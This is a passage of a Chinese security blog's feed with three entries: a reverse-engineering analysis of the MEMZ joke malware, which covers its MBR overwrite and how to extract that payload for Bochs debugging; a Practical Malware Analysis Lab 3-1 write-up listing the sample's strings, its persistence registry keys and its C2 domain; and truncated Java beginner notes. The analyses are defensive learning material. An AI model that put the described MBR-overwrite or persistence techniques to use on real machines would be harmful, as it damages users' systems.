devcraft.io</a></p><p><a href="https://paper.seebug.org/1817/#0x05">CVE-2021-22204 GitLab RCE 之 exiftool 代码执行漏洞深入分析（二） (seebug.org)</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MEMZ 样本分析</title>
    <link href="/2022/10/26/MEMZ%20%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <url>/2022/10/26/MEMZ%20%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p><code>MEMZ</code>属于是远古时期的一个样本了，其算是一个基本的恶搞程序，没有采取隐藏或者是免杀技术，适合刚入门的师傅们进行研究，但是<code>MEMZ</code>会修改<code>MBR</code>主引导扇区，以此来破坏电脑的正常启动，当用户重启时便会一直播放彩虹猫的画面，因此也不能完全算是一个恶搞，也带点木马的成分在里面。</p><h2 id="准备工作">准备工作</h2><p>我们采用之前搭建好的<code>Win10</code>分析环境下运行<code>MEMZ</code>，并准备相关的分析工具如<code>IDA</code>等。</p><p>和分析其他样本一样我们先将其上传在线云沙箱观察一下程序的对应信息，如导入导出表等等。获取一些初步的信息。</p><p>此处我们采用<code>微步云沙箱</code>，进行上传分析</p><img src="https://s2.loli.net/2022/10/23/dRO4F1tiWyG83Zl.png" alt="1.png" style="zoom: 75%;" /><p>可以看到彩虹猫的一些行为特征，修改<code>MBR</code>，安装钩子获取信息等等，我们观察其对应的导入导出表</p><img src="https://s2.loli.net/2022/10/23/p7bkJHt56NTeaEG.png" alt="2.png" style="zoom: 75%;" /><p>我们观察可以看到程序有创建文件、创建线程、创建对话框、设置鼠标等等相关的一些<code>API</code>函数，我们可以推测出其的一些相关功能特点</p><p><img src="https://s2.loli.net/2022/10/23/a3gF5WeEdCMqJli.png" alt="11.png"></p><p>同时在程序中有许许多多的<code>URL</code>，全部是谷歌的相关搜索，合理推测程序会联网打开这些网页</p><img src="https://s2.loli.net/2022/10/23/UDXIfPdV9lxHWmj.png" alt="3.png" style="zoom:80%;" /><p>沙箱的动态分析下我们可以观测到彩虹猫会自己创建六个线程，然后创建一个<code>txt</code>文件，前面所提到的许多导出函数在这个图中也有相关的体现</p><img src="https://s2.loli.net/2022/10/23/OXdxSMyLbj2mWrE.png" alt="4.png" style="zoom:80%;" /><h2 id="尝试运行">尝试运行</h2><p>我们通过云沙箱的一定分析后，尝试跑一下对应的恶意程序观察其相关的破坏性</p><p>当我们尝试运行时会收到作者的提示，告诉你这个是一个恶意程序，确保我们不是一不小心点开的，需要我们两次进行确认</p><p><img src="https://s2.loli.net/2022/10/23/AtFfacCQZzBn3UJ.png" alt="5.png"></p><p>我们确认后程序会生成一个<code>txt</code>，告诉我们电脑被彩虹猫破坏了</p><p><img src="https://s2.loli.net/2022/10/23/mYOw68JPLdpQvhl.png" alt="6.png"></p><p>之后会出现：</p><ul><li>电脑打开一些进程，如<code>画图</code>、<code>记事本</code>、<code>控制面板</code>等</li><li>文字出现反转，显示不正常</li><li>电脑桌面不断设置反色，然后回复正常</li><li>鼠标指针处出现各种报错图标，以及鼠标产生不正常的抖动</li><li>电脑弹出反正的警告以及报错声</li><li>电脑重启后出现彩虹猫</li><li>…</li></ul><p>如：</p><img src="https://s2.loli.net/2022/10/23/HBs8EjWJu9SG36U.png" alt="7.png" style="zoom: 50%;" /><p>当我们重启时候会产生一个蓝屏错误信息，随后启动便只剩下了一个彩虹猫，以及那奇妙的音乐…</p><img src="https://s2.loli.net/2022/10/23/83mDBLrxSEcW1iR.png" alt="8.png" style="zoom:50%;" /><img src="https://s2.loli.net/2022/10/23/PsZOv4Jzl7nxf2u.png" alt="9.png" style="zoom: 67%;" /><h2 id="逆向分析">逆向分析</h2><p>之后就是我们的最重要的部分，尝试逆向分析程序</p><p><img src="https://s2.loli.net/2022/10/23/kAJlpGQqwdXuhBD.png" alt="10.png"></p><p>放入<code>PE</code>进行查壳，发现是无壳<code>32位</code>位程序，拖入<code>IDA</code>中进行反编译</p><blockquote><p>需要注意一下，有些<code>PE</code>检测时会运行对应的程序，因为<code>MEMZ</code>存在有保护性确认，因此本地实体机分析时并不会产生太大的问题，但对于某些恶意样本可能会对主机产生不可逆的破坏</p></blockquote><p>拖入<code>IDA</code>反编译后可以发现程序十分的简单，仅有<code>26</code>个函数，同时结构也十分清晰，方便我们的分析。</p><h3 id="启动过程">启动过程</h3><p><img src="https://s2.loli.net/2022/10/25/8USsW9dvgQOFI4B.png" alt="12.png"></p><p><img src="https://s2.loli.net/2022/10/25/fsDC9PaQBVezoSb.png" alt="13.png"></p><p>通过观察我们可以看出<code>MEMZ</code>在询问我们是否启动后(两次警告过后)，便会创建六个<code>MEMZ</code>进程，带有<code>watchdog</code>的五个进程以及一个带有<code>main</code>的进程</p><p>此时我们就可以发现创建的进程会进入里面的<code>if</code>块，此时我们开始对<code>if</code>块内的一些东西进行分析</p><p><img src="https://s2.loli.net/2022/10/25/DYIsyME5THvaVom.png" alt="14.png"></p><p><code>MEMZ</code>在启动创建多个进程后，又会启动相应的线程来不断遍历内存中的相关进程数目</p><p><img src="https://s2.loli.net/2022/10/25/yJaYtD4hWGZCdIE.png" alt="15.png"></p><p>当我们手动关闭或者是关机时候，那么对应的进程数目便会减少，进而调用崩溃函数，引发崩溃</p><p><img src="https://s2.loli.net/2022/10/25/BfxzZMP1hdg6LoN.png" alt="21.png"></p><p>同时我们可以注意到<code>MEMZ</code>调用了<code>ntdll</code>中的一些无文档的提权函数，通过<code>dll</code>中的函数进行提权以及引发蓝屏异常，并强制用户重启</p><h3 id="修改MBR">修改MBR</h3><p><code>MEMZ</code>将覆写的数据进行提出，然后重新写入，导致了我们的磁盘启动后<code>BIOS</code>无法将权限给<code>MBR</code>进而无法启动<code>OS</code></p><p><img src="https://s2.loli.net/2022/10/25/L78pJUu2swMbBqh.png" alt="17.png"></p><p>即覆写逻辑为：</p><p><img src="https://pic4.zhimg.com/v2-3c70db094c82da7e3afa9536f26aff8b_r.jpg" alt=""></p><p>我们稍后尝试提取出修改的数据</p><h3 id="随机调用">随机调用</h3><p><img src="https://s2.loli.net/2022/10/25/faNGXKMpW1sDI2w.png" alt="18.png"></p><p><code>MEMZ</code>创建线程来进行随机打开文件，于<code>off_405130</code>处我们可以看到执行的函数每两个<code>dword</code>一组，每次执行完后，采用地址<code>+2</code>，获取下一个函数的地址</p><p><img src="https://s2.loli.net/2022/10/25/2jFWPkbm4YRHi5e.png" alt="22.png"></p><h4 id="随机打开进程">随机打开进程</h4><h4 id="打开网页">打开网页</h4><p><img src="https://s2.loli.net/2022/10/25/oIfiV9a2UKnS7yv.png" alt="19.png"></p><img src="https://s2.loli.net/2022/10/25/nzYvo1dENRUFIcj.png" alt="20.png" style="zoom: 80%;" /><p>通过随机数来进行随机的打开进程，并返回一个随机数</p><h3 id="鼠标抖动">鼠标抖动</h3><p><img src="https://s2.loli.net/2022/10/25/AcqkD1gvxGpFn9N.png" alt="23.png"></p><p>通过随机数来改变当前鼠标所在位置，达到鼠标指针抖动效果</p><h3 id="随机输入">随机输入</h3><p><img src="https://s2.loli.net/2022/10/25/pwUHTcXi9DgnFeh.png" alt="24.png"></p><p><code>MEMZ</code>通过<code>Hook</code>输入信息并通过随机数产生输入进行发送</p><h3 id="播放声音">播放声音</h3><p><img src="https://s2.loli.net/2022/10/25/oOZvUDuekJNcsRr.png" alt="25.png"></p><h3 id="改变桌面">改变桌面</h3><p><img src="https://s2.loli.net/2022/10/25/6cheOMISTKHzYrm.png" alt="26.png"></p><h3 id="随机位置弹提示框">随机位置弹提示框</h3><p><img src="https://s2.loli.net/2022/10/25/9t4XLg8V3JES2Br.png" alt="27.png"></p><p><img src="https://s2.loli.net/2022/10/25/Jy1FfHpQjBGD5d3.png" alt="28.png"></p><p><img src="https://s2.loli.net/2022/10/25/eKdySQqR18p52jX.png" alt="29.png"></p><h3 id="文字反转">文字反转</h3><p><img src="https://s2.loli.net/2022/10/25/eRndMcOkhiDL8QE.png" alt="30.png"></p><h3 id="小总结">小总结</h3><p>双击打开病毒文件时，首先弹出警告框，点取消直接退出，点确定则创建五个参数<code>/watchdog</code>和一个参数<code>/main</code>的进程。</p><p><code>/watchdog</code>进程检测是否有病毒进程被关闭或者将要关机，有的话弹出20个提示框，然后蓝屏/关机。</p><p><code>/main</code>进程首先修改磁盘<code>MBR</code>，然后用记事本弹出信息，最后循环执行打开程序/播放声音/反色屏幕/放图片/不断缩放屏幕/随意复制屏幕内容等操作并堵塞。</p><h2 id="MBR修改内容提取">MBR修改内容提取</h2><p>我们前面提到了<code>MEMZ</code>会修改<code>MBR</code>内容，那么修改了什么呢？我们尝试提取一下。</p><p>我们可以通过<code>IDA</code>调试拿到数据，我们前文所分析过了，<code>MEMZ</code>会创建带参数的启动，其中带<code>/main</code>参数的可以修改<code>MBR</code>，因此我们在对应位置上打上一个断点，提取就是了</p><blockquote><p>注意此处调试需要带参数</p></blockquote><p>那么问题来了，我们提取到后该怎么分析呢？</p><p>我们可以使用虚拟机<code>Bochs</code>来进行调试</p><blockquote><p><code>Bochs</code>是一个开源的虚拟机，同时<code>Bochs</code>完全是靠软件来模拟整个<code>PC</code>环境，因此它非常的适合开发操作系统</p></blockquote><p>我们提取到了对应的<code>MBR</code>，我们利用<code>Bochs</code>中的创建磁盘可以新建一个启动硬盘</p><p><img src="https://s2.loli.net/2022/10/26/sc3Vu1lDGJHaWRQ.png" alt="31.png"></p><p>我们找到<code>Bochs</code>的安装文件夹，以管理员权限进行打开<code>bximage</code></p><p><img src="https://s2.loli.net/2022/10/26/Hw2QR3koIvqYjBy.png" alt="32.png"></p><p>按照上图进行设置，磁盘大小以及名字可以自己定义，需要注意的是不要带有任何的中文</p><p><img src="https://s2.loli.net/2022/10/26/YnJPHqBeSgduR48.png" alt="33.png"></p><p>之后找到<code>bochsrc-sample</code>进行修改</p><p><img src="https://s2.loli.net/2022/10/26/bkJ1ip67lsdZwrP.png" alt="34.png"></p><p><img src="https://s2.loli.net/2022/10/26/E5qabn6rDGN3h1S.png" alt="35.png"></p><blockquote><p>此处的<code>abc</code>为一个文件夹，文件夹不要带任何的中文！！！</p></blockquote><p>按照上述过程设置完毕后，将<code>txt</code>文件后缀改为<code>bxrc</code>，之后启动，然后选择<code>continue</code>，加载一次镜像成功后便可以将<code>bxrc</code>文件直接拖入<code>IDA</code>进行调试分析</p><p><img src="https://s2.loli.net/2022/10/26/eA3KnZsGJpVRDrj.png" alt="36.png"></p><p>我们反汇编后可以看到其主要是 16 位的汇编和底层机器进行打交道，我们比较难以观察，于是采用动调观察修改后的启动过程</p><p><img src="https://s2.loli.net/2022/10/26/ipIDUxQG5eLT2BA.png" alt="37.png"></p><p>我们大致可以得到如下过程图：</p><p><img src="https://s2.loli.net/2022/10/26/gIwNAeoscy6u7Hn.png" alt="38.png"></p><p>至此样本分析大致就结束了</p><blockquote><p>不知道为什么在<code>bochs</code>上跑出来的彩虹猫音乐变成了全损😥</p></blockquote><h2 id="总结">总结</h2><p><code>MEMZ</code>的感染特征比较的明显，可以对比<code>MBR</code>数据是否为其修改过后的数据，来判断是否中毒</p><p>同时<code>MEMZ</code>仅存在<code>MBR</code>部分为恶意部分，其他小玩意均为无害，可以拿来图一乐，以及感叹作者能利用 16 位汇编展现动画</p><p>有时间的话想自己写一个相似的小玩意，但苦于学业压力，天天被迫赶作业🙄🙄</p>]]></content>
    
    
    <categories>
      
      <category>Reverse Practice</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第一次恶意代码分析 —— 恶意代码分析实战 Lab 3-1</title>
    <link href="/2022/10/04/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%20%E2%80%94%E2%80%94%20%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20Lab%203-1/"/>
    <url>/2022/10/04/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%20%E2%80%94%E2%80%94%20%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20Lab%203-1/</url>
    
    <content type="html"><![CDATA[<h2 id="一些废话">一些废话</h2><p>折腾了几天的<code>OS</code>，终于搭建完成了一个<code>win10</code>的分析环境，本来兴冲冲的开始分析时，运行程序发现没有点反应</p><blockquote><p>想想也是，恶意程序运行后能有什么明显反应一样的 XD</p></blockquote><p>搞了半天以为我环境出现了问题，结果在查看进程分析的时候发现其引发了<code>Windows</code>的一个报错机制，但是没有回显，<code>Wireshark</code>等分析软件也没有捕获到任何有效信息，此时我开始觉得我环境是不是真的运行不起来 …</p><p>在找到一个 17 年的博客发现，好像还真跑不起来，作者在<code>win10</code>等各个环境下运行点动静都没，我也尝试在微步云的<code>win10</code>、<code>win7</code>的沙箱运行，发现也都运行不起来。</p><p>由于那位作者成功于<code>32位XP</code>上成功运行，因此我也准备来搭建一个 04 年的<code>32位XP</code>古董<code>OS</code>，只能说太折磨了…各种软件适配，小到输入法，各个软件找到能用的版本太难了…又花了将近一天时间才搭建完成…</p><h2 id="初步分析">初步分析</h2><p>拿到一个恶意程序后，第一步便是将其上传到一个沙箱进行测试，我们此处使用<code>VirusTotal</code></p><p>可以很明显的看到有<code>67</code>个杀软报毒，说明该样本已经能够被大部分杀软识别进行消灭了</p><img src="https://s2.loli.net/2022/10/03/d5ApqKNToSeIb7Q.png" alt="1.png" style="zoom:67%;" /><h3 id="信息整理">信息整理</h3><h4 id="导入导出表">导入导出表</h4><p>导入导出表也是我们需要关注的地方，通过观察其导入的函数我们可以进行猜测程序的功能，进一步的判断恶意程序的类型以及功能</p><img src="https://s2.loli.net/2022/10/03/ZNlaXHouSkei9wT.png" alt="2.png"  /><p>可以看到程序就只导入了一个<code>Kernel32.dll</code>，同时也就只存在一个函数，我们此时可以怀疑程序是否加了壳，导致无法进行直接的分析</p><h4 id="行为">行为</h4><p>通过<code>VirusTotal</code>的行为分析我们可以看到有互联网的链接操作，因此怀疑程序会从互联网上下载东西，我们可以看到对应的一个域名<code>www.practicalmalwareanalysis.com</code>,我们可以进行合理猜测从其中下载了对应恶意程序</p><h4 id="字符串">字符串</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++">!This program cannot be run in DOS mode.   <span class="hljs-comment">//这个是编译器自动生成的，编译器的类型应该是vs的编译器</span><br>Rich   <span class="hljs-comment">//这个很有可能是作者的名字（猜测）</span><br>.text   <span class="hljs-comment">//这个有点像PE头的text字段</span><br>`.data   <span class="hljs-comment">//这个和上面一样，但是多了一个符号，很有可能和上面的一起，是注释</span><br>ExitProcess   <span class="hljs-comment">//有可能是注释</span><br>kernel32.dll   <span class="hljs-comment">// 可能注释</span><br>CONNECT %s:%i HTTP/<span class="hljs-number">1.0</span>   <span class="hljs-comment">//这个有可能是程序的printf类的函数的参数，%s可能是域名，%i作用和%d差不多（其实差别很大，但是为了方便理解，这里可以把%i看出%d），应该是端口号</span><br>advapi32   <span class="hljs-comment">//这是提供基本函数的链接库</span><br>ntdll   <span class="hljs-comment">//底层API实现库</span><br>user32   <span class="hljs-comment">//这个是windows用户界面相关应用程序接口</span><br>advpack   <span class="hljs-comment">//用来帮助硬件和软件读取和验证.INF文件，INF是硬件设备制造商发布起驱动程序的一种文件格式（说明这个病毒很有可能要去感染某个驱动)</span><br>StubPath   <span class="hljs-comment">//不明的某个路径</span><br>SOFTWARE\Classes\http\shell\open\commandV   <span class="hljs-comment">//打开一个http的shell command</span><br>Software\Microsoft\Active Setup\Installed Components\   <span class="hljs-comment">//安装程序</span><br>test   <span class="hljs-comment">//可能是注释</span><br>www.practicalmalwareanalysis.com   <span class="hljs-comment">//恶意域名</span><br>admin   <span class="hljs-comment">//有可能是下载网站或者恶意代码的用户名</span><br>VideoDriver   <span class="hljs-comment">//显卡驱动（很有可能会感染显卡驱动)</span><br>WinVMX32-   <span class="hljs-comment">//那个互斥变量的名字，后面多了一个字符，有可能是注释</span><br>vmx32to64.exe   <span class="hljs-comment">//一个程序的名字</span><br>SOFTWARE\Microsoft\Windows\CurrentVersion\Run   <span class="hljs-comment">//运行其他程序</span><br>SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders<br>AppData   <br></code></pre></td></tr></table></figure><h2 id="逆向分析">逆向分析</h2><p>原先计划时采用逆向的方式来进行分析，结合前面我们只观察到一个导入函数，我们可以猜测有壳的存在，使用<code>PEid</code>进行查看</p><img src="https://s2.loli.net/2022/10/04/1KCl9RDeHhTBy5A.png" alt="4.png" style="zoom:100%;" /><p>可以很清楚的看到使用了<code>PEncrypt</code>填充了大量垃圾代码，不便于我们的逆向工作。因此我们采用执行恶意程序，通过其他软件来检测其行为的方式来动态进行获取恶意程序的功能。</p><blockquote><p>同时逆向可能需要花许多时间在判断以及处理垃圾代码上，比较花费时间，而直接执行可以帮助我们快速发现程序干了些什么</p></blockquote><h2 id="动态分析">动态分析</h2><p>我们需要准备好虚拟的服务器，以及进程监视，注册表监视等等，我们需要提前打开进行配置，然后设置断网环境，使用虚拟机间的虚假网络构造一个服务器通信，此处使用<code>Kali</code>的<code>inetsim</code>，以及<code>Win xp</code>版本的<code>ApateDNS</code>。</p><p>随后我们运行恶意程序，观察各个监视器获取到的信息</p><h3 id="DNS-Log">DNS Log</h3><img src="https://s2.loli.net/2022/10/04/X7AfHZEDxCr21Ov.png" alt="5.png" style="zoom:100%;" /><p>我们通过<code>DNS</code>可以发现恶意程序访问了字符串中对应的网站，因此我们可以确定，该网站为对应的恶意网站，恶意程序通过网络进行链接，然后执行相关操作</p><h3 id="Regshot">Regshot</h3><img src="https://s2.loli.net/2022/10/04/tHws7M824hLapBb.png" alt="7.png" style="zoom:150%;" /><p>通过运行前后的注册表对比，我们可以看到程序设置了一个启动项，内容为后面的16进制，我们进行转换一下</p><img src="https://s2.loli.net/2022/10/04/x3tzXKjPMgoFWdG.png" alt="6.png" style="zoom:67%;" /><p>至此我们可以看到程序字符串中的<code>vm32to64</code>被创建在了系统目录下，同时设置其为启动项，我们可以在对应目录下找到对应程序</p><img src="https://s2.loli.net/2022/10/04/Wv9jViCTHB1deuP.png" alt="10.png" style="zoom: 80%;" /><h3 id="Process-Explore">Process Explore</h3><p>我们可以观察其创建的互斥量、以及相关装载库</p><h4 id="相关信息">相关信息</h4><img src="https://s2.loli.net/2022/10/04/KcRIPgvsNn8jqE9.png" alt="12.png" style="zoom:150%;" /><h4 id="相关DLL">相关DLL</h4><img src="https://s2.loli.net/2022/10/04/nJgRf6ciNtQM2mG.png" alt="11.png" style="zoom:150%;" /><h3 id="Process-Monitor">Process Monitor</h3><p>我们添加对应的过滤器，观察程序的一些行为特征，我们可以看到程序创建了<code>vm32to64</code>，同时也设置了一些注册表的<code>Seed</code></p><blockquote><p>此处不太清楚这些<code>Seed</code>有什么用处，参考网上其他相关分析的博客，大致可以的推断出来是随机数发生器的种子，应该忽略</p></blockquote><img src="https://s2.loli.net/2022/10/04/MmStPWrl1pE8CfT.png" alt="9.png" style="zoom:150%;" /><p>同时我们也可以通过观察可以发现其装载的一些<code>dll</code></p><img src="https://s2.loli.net/2022/10/04/wQksMct4WeD89HK.png" alt="8.png" style="zoom:150%;" /><blockquote><p><code>ws2_32.dll</code>、<code>wshtcpip.dll</code>，可以帮我们推测恶意程序具有联网功能</p></blockquote><h2 id="相关整理">相关整理</h2><h3 id="程序逻辑">程序逻辑</h3><p>我们观察上述各个软件的记录信息后，可以整理出程序的大致逻辑：</p><p>程序创建了一个网络链接，连接到<code>www.practicalmalwareanalysis.com</code>网站上，然后创建<code>vm32to64</code>的启动项，我们合理猜测程序是创建了一个后门程序，通过网站发出对应的指令，客户端便会做出相应操作</p><h3 id="判断是否被感染">判断是否被感染</h3><p>我们可以通过网络通信是否访问过<code>www.practicalmalwareanalysis.com</code>，以及检查在<code>C:\WINDOWS\system32\</code>下是否存在有<code>vm32to64</code></p><h3 id="处理措施">处理措施</h3><p>可能直接删除<code>vm32to64</code>即可 ？</p><h2 id="总结">总结</h2><p>开始分析前的环境搭建挺折磨人的，不过搭建好了就是一劳永逸。</p><p>此次分析也是第一次研究分析一个恶意程序，学习到了分析一个恶意程序的大致流程以及相关工具的简单使用。</p><p>分析过程中可能有许多不足或者是不够的地方，也还请多多包涵，也欢迎师傅们提出自己的看法，给一些相关的建议等等。</p><h2 id="参考链接">参考链接</h2><p>恶意代码分析实战 Lab 3-1 习题笔记： <a href="https://blog.csdn.net/isinstance/article/details/77679894">https://blog.csdn.net/isinstance/article/details/77679894</a></p>]]></content>
    
    
    <categories>
      
      <category>Malicious Code Analysis</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Java瞎学速成记录</title>
    <link href="/2022/10/01/Java/"/>
    <url>/2022/10/01/Java/</url>
    
    <content type="html"><![CDATA[<h2 id="声明">声明</h2><p>本文基于<code>C++</code>、<code>Python</code>的语言基础进行学习</p><h2 id="编译">编译</h2><p>通过<code>javac</code>进行编译我们的<code>.java</code>文件，编译后的文件是<code>.class</code>文件</p><h2 id="运行">运行</h2><p>我们可以编译后的<code>.class</code>文件不能直接执行需要我们使用命令<code>java &lt;class file&gt;</code></p><p><code>class</code>文件时<code>java</code>对应的字节码文件，在类装载器、字节码校验器、解释器的作用下完成对应的解释，进而完成程序对应的功能</p><blockquote><p>通关<code>JVM</code>虚拟机来进行后续的操作，使程序运行</p></blockquote><h2 id="一些特性">一些特性</h2><p><code>java</code>有<code>编译型</code>与<code>解释型</code>的两种特征</p><p><code>java</code>的实现方式都需要包含在一个类<code>class</code>中</p><p>其中主类<code>main</code>的为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function">pubilc <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br><span class="hljs-comment">// XXX</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="简单的输出">简单的输出</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-string">&quot;XXX&quot;</span>)<br></code></pre></td></tr></table></figure><p><code>XXX</code>可以替换为任意字符串</p><h2 id="简单输入">简单输入</h2><p>相对输出而言输入读取需要我们加入一个包<code>java.util.Scanner</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br><span class="hljs-function">pubilc <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>    Scanner input = <span class="hljs-keyword">new</span> Scanner(System.in);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="注释">注释</h2><p>与<code>C 语言</code>类似，<code>java</code>的注释包含三种：单行注释、多行注释、文档注释</p><p>单行注释：<code>//</code></p><p>多行注释：<code>/**/</code></p><p>文档注释：<code>/**  */</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> Hello</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h2 id="标识符">标识符</h2><p>标识符应该以字母，美元符号(<code>$</code>)、或者下划线开始(<code>_</code>)</p><p>不能用关键字作为变量或者方法名</p><p>标识符使大小写敏感的，对于变量如：<code>A</code>和<code>a</code>是两个变量，同时在定义变量时不能够重复</p><blockquote><p>可以使用中文作为变量名，但是不建议</p></blockquote><h2 id="数据类型">数据类型</h2><h3 id="基本类型">基本类型</h3><p>和<code>C 语言</code>一样，拥有<code>int</code>(4字节)、<code>short</code>(2字节)、<code>long</code>(8字节)、<code>float</code>(4字节)、<code>double</code>(8字节)、<code>char</code>(2字节)</p><blockquote><p>一位占八位二进制数 1 B(byte) = 8bit (位)</p></blockquote><blockquote><p><code>float</code>类型要在数字后面加一个<code>F</code></p><p><code>long</code>类型要加一个<code>L</code></p></blockquote><p>同时不太一样的是<code>java</code>拥有<code>char</code>是占用两个字节的，对此<code>java</code>也引入了<code>byte</code>(1字节)数据进行替代</p><p><code>java</code>中还有一个<code>boolean</code>类型与<code>C 语言</code>中的<code>bool</code>一样是属于布尔类型的，只有<code>True</code>和<code>False</code>两种状态，只占用一位</p><p><code>java</code>中还有一个<code>String</code>类型，和<code>C++</code>中的相似</p><blockquote><p><code>float</code>存在有一个范围，存在有舍入误差，可能出现有接近但不等于的情况，计算后尽量不要使用浮点数进行比较，否则可能会出现错误的判断结果</p><p>可以使用一个库进行保存大数：<code>BigDecimal</code></p></blockquote><h3 id="引用类型">引用类型</h3><p>引用类型包括类、接口、数组</p><h2 id="类型转换">类型转换</h2><h3 id="类型大小排序">类型大小排序</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">byte</span> -&gt; <span class="hljs-keyword">short</span> -&gt; <span class="hljs-keyword">int</span> -&gt; <span class="hljs-keyword">long</span> -&gt; <span class="hljs-keyword">float</span> -&gt; <span class="hljs-keyword">double</span><br></code></pre></td></tr></table></figure><p><strong>知识点：</strong><code>byte/short/int/long</code>在和<code>int</code>一起计算的时候都会转为<code>int</code></p><h3 id="类型转换方式">类型转换方式</h3><p>大转小强制转换。小转大自动转换</p><p>强制转换方式与<code>C 语言</code>方式相同：<code>(类型)变量名</code></p><blockquote><p>不能把对象类型转换为不相干的类型</p><p>同时转换的时候注意溢出问题</p></blockquote><h3 id="JDK7特性">JDK7特性</h3><p>数字之间可以加下划线分割，下划线不会被输出</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span> num = <span class="hljs-number">100</span>_<span class="hljs-number">0000</span>_<span class="hljs-number">0000</span>;<br></code></pre></td></tr></table></figure><h2 id="变量">变量</h2><p><code>Java</code>变量定义方式与<code>C 语言</code>相同，不同的是将<code>C</code>中的<code>const</code>更改为了<code>final</code>来进行定义常量</p><h2 id="运算符">运算符</h2><p>在计算中，对于<code>long</code>、<code>int</code>、<code>short</code>、<code>byte</code>之间的运算，如果有<code>long</code>的参与，那么最后的结果便是<code>long</code>类型的，不存在<code>long</code>类型时，其他的类型相互运算后得到的结果是<code>int</code>类型的</p><h3 id="幂运算">幂运算</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Math.pow(a,b) <span class="hljs-comment">// a^b</span><br></code></pre></td></tr></table></figure><p>使用<code>Math</code>类来计算<code>a 的 b 次幂</code></p><h3 id="短路运算">短路运算</h3><p>我们赋值时当存在有<code>&amp;&amp;</code>时当<code>&amp;&amp;</code>的前半部分为<code>0</code>时，后半部分的内容不会被执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> a=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">boolean</span> c =(a&lt;<span class="hljs-number">2</span>)&amp;&amp;(a++&gt;<span class="hljs-number">5</span>);<br>System.out.println(a); <span class="hljs-comment">// 5</span><br></code></pre></td></tr></table></figure><h3 id="特性">特性</h3><p>在输出的时候<code>+</code>可以作为连接符，将前后的内容进行连接后输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-string">&quot;XX&quot;</span>+<span class="hljs-string">&quot;YY&quot;</span>);<br><span class="hljs-comment">//XXYY</span><br></code></pre></td></tr></table></figure><blockquote><p>需要注意的是，当字符串(<code>String</code>)类型的在前，那么后面的<code>+</code>会被解析为连接符，如果字符串(<code>String</code>)类型的在后，那么前面的<code>+</code>会被解析为<code>加法</code>运算</p></blockquote><h2 id="包机制">包机制</h2><p><code>Java</code>提供了包机制，用于区别类名的命名空间</p><blockquote><p>包的本质就是文件夹</p></blockquote><p>包语句的语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> pk1[.pkg2[.pkg3 